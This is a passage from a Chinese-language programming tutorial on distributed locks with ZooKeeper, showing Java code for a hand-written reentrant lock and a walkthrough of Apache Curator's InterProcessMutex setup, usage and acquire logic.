class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        currentNodePath = zooKeeper.create(ROOT_PATH + <span class="hljs-string">&quot;/&quot;</span> + lockName + <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-literal">null</span>, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL);<br>        <span class="hljs-comment">// 获取前驱节点：若前驱节点为空，则获取锁成功，否则监听该节点</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">preNode</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getPreNode();<br>        <span class="hljs-keyword">if</span> (preNode != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 利用闭锁实现阻塞</span><br>            <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">countDownLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);<br>            <span class="hljs-comment">// 因为获取前驱节点操作不具备原子性，需要再次判断zk中的前驱节点是否存在</span><br>            <span class="hljs-keyword">if</span> (zooKeeper.exists(ROOT_PATH + <span class="hljs-string">&quot;/&quot;</span> + preNode, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Watcher</span>() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent watchedEvent)</span> &#123;<br>                    countDownLatch.countDown();<br>                &#125;<br>            &#125;) == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            countDownLatch.await();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">getPreNode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 获取根节点下的所有节点</span><br>        List&lt;String&gt; children = <span class="hljs-built_in">this</span>.zooKeeper.getChildren(ROOT_PATH, <span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(children)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>(<span class="hljs-string">&quot;非法操作&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 获取根节点中对应于当前锁的所有节点</span><br>        List&lt;String&gt; nodes = children.stream().filter(node -&gt; StringUtils.startsWith(node, lockName + <span class="hljs-string">&quot;-&quot;</span>)).collect(Collectors.toList());<br>        <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(nodes)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>(<span class="hljs-string">&quot;非法操作&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 按照序列号排序</span><br>        Collections.sort(nodes);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">currentNode</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(currentNodePath, <span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-comment">// 获取当前节点对应的下标</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> Collections.binarySearch(nodes, currentNode);<br>        <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>(<span class="hljs-string">&quot;非法操作&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// 返回当前节点的前驱节点</span><br>            <span class="hljs-keyword">return</span> nodes.get(index - <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>(<span class="hljs-string">&quot;非法操作&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 删除ZNode节点</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-built_in">this</span>.zooKeeper.delete(currentNodePath, -<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125; <span class="hljs-keyword">catch</span> (KeeperException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-5-3-实现可重入功能"><a href="#3-5-3-实现可重入功能" class="headerlink" title="3.5.3 实现可重入功能"></a>3.5.3 实现可重入功能</h4><p>通过ThreadLocal这一线程局部变量，记录重入次数</p><p>改造代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 判断thread local中是否已经有锁，有锁则直接重入+1</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> THREAD_LOCAL.get();<br>        <span class="hljs-keyword">if</span> (flag != <span class="hljs-literal">null</span> &amp;&amp; flag &gt; <span class="hljs-number">0</span>) &#123;<br>            THREAD_LOCAL.set(flag + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        currentNodePath = zooKeeper.create(ROOT_PATH + <span class="hljs-string">&quot;/&quot;</span> + lockName + <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-literal">null</span>, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL);<br>        <span class="hljs-comment">// 获取前驱节点：若前驱节点为空，则获取锁成功，否则监听该节点</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">preNode</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getPreNode();<br>        <span class="hljs-keyword">if</span> (preNode != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 利用闭锁实现阻塞</span><br>            <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">countDownLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);<br>            <span class="hljs-comment">// 因为获取前驱节点操作不具备原子性，需要再次判断zk中的前驱节点是否存在</span><br>            <span class="hljs-keyword">if</span> (zooKeeper.exists(ROOT_PATH + <span class="hljs-string">&quot;/&quot;</span> + preNode, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Watcher</span>() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent watchedEvent)</span> &#123;<br>                    countDownLatch.countDown();<br>                &#125;<br>            &#125;) == <span class="hljs-literal">null</span>) &#123;<br>                THREAD_LOCAL.set(<span class="hljs-number">1</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            countDownLatch.await();<br>        &#125;<br>        THREAD_LOCAL.set(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 删除ZNode节点</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        THREAD_LOCAL.set(THREAD_LOCAL.get() - <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 减为0则删除</span><br>        <span class="hljs-keyword">if</span> (THREAD_LOCAL.get() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">this</span>.zooKeeper.delete(currentNodePath, -<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125; <span class="hljs-keyword">catch</span> (KeeperException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-6-Curator"><a href="#3-6-Curator" class="headerlink" title="3.6 Curator"></a>3.6 Curator</h3><p>Curator由一系列的模块构成，对于一般开发者而言，常用的是curator-framework和curator-recipes：</p><ul><li>curator-framework：提供了常见的zk相关的底层操作</li><li>curator-recipes：提供了一些zk的典型使用场景的参考</li></ul><ol><li><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.curator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>curator-framework<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.zookeeper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>zookeeper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.curator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>curator-recipes<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.zookeeper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>zookeeper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.zookeeper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>zookeeper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.14<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>配置Curator：新建CuratorConfig配置类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CuratorConfig</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> CuratorFramework <span class="hljs-title function_">curatorFramework</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 初始化重试策略，使用的指数补偿策略</span><br>        <span class="hljs-type">RetryPolicy</span> <span class="hljs-variable">retry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExponentialBackoffRetry</span>(<span class="hljs-number">10000</span>, <span class="hljs-number">3</span>); <span class="hljs-comment">// 设置初始间隔时间与重试次数</span><br>        <span class="hljs-comment">// 初始化curatork客户端</span><br>        <span class="hljs-type">CuratorFramework</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> CuratorFrameworkFactory.newClient(<span class="hljs-string">&quot;127.0.0.1:2181&quot;</span>, retry);<br>        client.start(); <span class="hljs-comment">// 手动启动，否则很多方法功能不能够工作</span><br>        <span class="hljs-keyword">return</span> client;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="3-6-1-InterProcessMutex"><a href="#3-6-1-InterProcessMutex" class="headerlink" title="3.6.1 InterProcessMutex"></a>3.6.1 InterProcessMutex</h4><p>与ReentrantLock类似，拥有可重入的特性。</p><h5 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h5><p>注入CuratorFramework，修改StockService中的deduct方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> CuratorFramework curatorFramework;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">InterProcessMutex</span> <span class="hljs-variable">mutex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InterProcessMutex</span>(curatorFramework, <span class="hljs-string">&quot;/curator/locks&quot;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        mutex.acquire();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>            <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 扣减库存</span><br>                redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">this</span>.testSub(mutex); <span class="hljs-comment">// 测试可重入</span><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            mutex.release();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSub</span><span class="hljs-params">(InterProcessMutex mutex)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        mutex.acquire();<br>        System.out.println(<span class="hljs-string">&quot;测试可重入锁。。。。&quot;</span>);<br>        mutex.release();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="底层原理-1"><a href="#底层原理-1" class="headerlink" title="底层原理"></a>底层原理</h5><p>InterProcessMutex初始化原理</p><ol><li><p>首先调用如下构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 将传入的参数再传入到下一个构造方法中</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">InterProcessMutex</span><span class="hljs-params">(CuratorFramework client, String path)</span><br>&#123;<br>    <span class="hljs-built_in">this</span>(client, path, <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardLockInternalsDriver</span>());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>进一步调用构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// this中的第一个参数为传进来的client，第二个参数为传进来的path</span><br><span class="hljs-comment">// 第三个参数为常量LOCK_NAME:&quot;lock-&quot;</span><br><span class="hljs-comment">// 第四个参数为驱动Driver：new StandardLockInternalsDriver()</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">InterProcessMutex</span><span class="hljs-params">(CuratorFramework client, String path, LockInternalsDriver driver)</span><br>&#123;<br>    <span class="hljs-comment">// 1为租约：maxLeases</span><br>    <span class="hljs-built_in">this</span>(client, path, LOCK_NAME, <span class="hljs-number">1</span>, driver);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>再进一步调用构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">InterProcessMutex(CuratorFramework client, String path, String lockName, <span class="hljs-type">int</span> maxLeases, LockInternalsDriver driver)<br>&#123;<br>    <span class="hljs-comment">// 这是对传进来的path参数做校验</span><br>    basePath = PathUtils.validatePath(path);<br>    <span class="hljs-comment">// LockInternals实例化很关键，之后的加锁与解锁方法都需要用到这个类</span><br>    internals = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LockInternals</span>(client, driver, path, lockName, maxLeases);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>创建LockInternals对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">LockInternals(CuratorFramework client, LockInternalsDriver driver, String path, String lockName, <span class="hljs-type">int</span> maxLeases)<br>&#123;<br>    <span class="hljs-built_in">this</span>.driver = driver;<br>    <span class="hljs-built_in">this</span>.lockName = lockName;<br>    <span class="hljs-built_in">this</span>.maxLeases = maxLeases;<br><br>    <span class="hljs-built_in">this</span>.client = client.newWatcherRemoveCuratorFramework();<br>    <span class="hljs-comment">// 再次校验path参数</span><br>    <span class="hljs-built_in">this</span>.basePath = PathUtils.validatePath(path);<br>    <span class="hljs-comment">// 将路径与锁名称进行拼接</span><br>    <span class="hljs-built_in">this</span>.path = ZKPaths.makePath(path, lockName);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>加锁原理</p><ol><li><p>执行 <code>mutex.acquire()</code> 方法时，内部调用acquire方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-keyword">if</span> ( !internalLock(-<span class="hljs-number">1</span>, <span class="hljs-literal">null</span>) )<br>    &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Lost connection while trying to acquire lock: &quot;</span> + basePath);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>内部又调用了internalLock方法：直接看注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">internalLock</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-comment">// 获取当前线程</span><br>    <span class="hljs-type">Thread</span> <span class="hljs-variable">currentThread</span> <span class="hljs-operator">=</span> Thread.currentThread();<br><span class="hljs-comment">// 通过当前线程获取localData对象</span><br>    <span class="hljs-type">LockData</span> <span class="hljs-variable">lockData</span> <span class="hljs-operator">=</span> threadData.get(currentThread);<br>    <span class="hljs-comment">// 如果lockData不为null，说明发生了重入</span><br>    <span class="hljs-keyword">if</span> ( lockData != <span class="hljs-literal">null</span> )<br>    &#123;<br>        <span class="hljs-comment">// 将重入次数加1，然后直接返回即可</span><br>        lockData.lockCount.incrementAndGet();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><span class="hljs-comment">// lockData为null，说明是获取新的锁</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lockPath</span> <span class="hljs-operator">=</span> internals.attemptLock(time, unit, getLockNodeBytes());<br>    <span class="hljs-keyword">if</span> ( lockPath != <span class="hljs-literal">null</span> )<br>    &#123;<br>        <span class="hljs-comment">// 创建一个新的lockData，并将当前线程的lockData记录到哈希表中</span><br>        <span class="hljs-type">LockData</span> <span class="hljs-variable">newLockData</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LockData</span>(currentThread, lockPath);<br>        threadData.put(currentThread, newLockData);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中threadData是一个ConcurrentMap，key为Thread，值为LockData。记录了重入信息。</p><p>LockData是一个内部类</p><p>threadData与LockData属性如下所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentMap&lt;Thread, LockData&gt; threadData = 